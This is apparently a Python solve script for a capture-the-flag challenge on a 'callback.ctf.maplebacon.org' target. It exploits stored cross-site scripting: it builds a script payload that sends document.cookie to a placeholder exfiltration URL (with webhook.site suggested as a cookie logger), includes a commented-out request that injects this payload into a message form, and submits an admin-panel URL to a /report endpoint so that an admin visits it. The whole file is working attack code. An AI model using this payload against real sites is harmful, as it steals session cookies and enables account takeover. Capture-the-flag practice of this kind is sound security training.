import requests
import asyncio
import hashlib

# stored XSS on /report

async def main():
    target_url = "http://callback.ctf.maplebacon.org"
    exfil_url = "EXFIL_URL" # any cookie logger, like webhook.site
    payload = f"""fetch("{exfil_url}?cookie="+document.cookie)"""
    name = "myrandomname"
    s = requests.Session()
    # r = s.post(f"{target_url}/leave-message", data={"name": name, "phone": "111-111", "message": f"<script>{payload}</script>"})
    r = s.post(f"{target_url}/report", data={"url": f"{target_url}/admin-panel?key={hashlib.sha1(bytes(name,'utf-8')).hexdigest()}"})
    print(r.text)

if __name__ == '__main__':
    asyncio.run(main())
